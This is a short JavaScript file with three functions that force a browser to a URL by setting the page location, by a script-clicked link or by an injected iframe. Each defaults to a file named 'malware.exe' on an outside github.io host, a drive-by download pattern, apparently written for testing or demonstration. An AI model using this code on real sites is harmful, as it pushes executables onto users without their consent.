var default_url = "https://zionma.github.io/malware.exe";

function redirect_location(url) {
  if (url === "") url = default_url;

  window.location.href = url;
}

function redirect_a(url) {
  if (url === "") url = default_url;
  
  var aTag = document.createElement('a');
  aTag.setAttribute('id', 'aTag');
  aTag.setAttribute('href', url);
  document.body.appendChild(aTag);

  //aTag = document.getElementById('aTag');
  aTag.click();
}

function redirect_iframe(url) {
  if (url === "") url = default_url;
  
  var iframeTag = document.createElement('iframe');
  iframeTag.setAttribute('id', 'iframeTag');
  iframeTag.src = url;

  document.body.appendChild(iframeTag);
}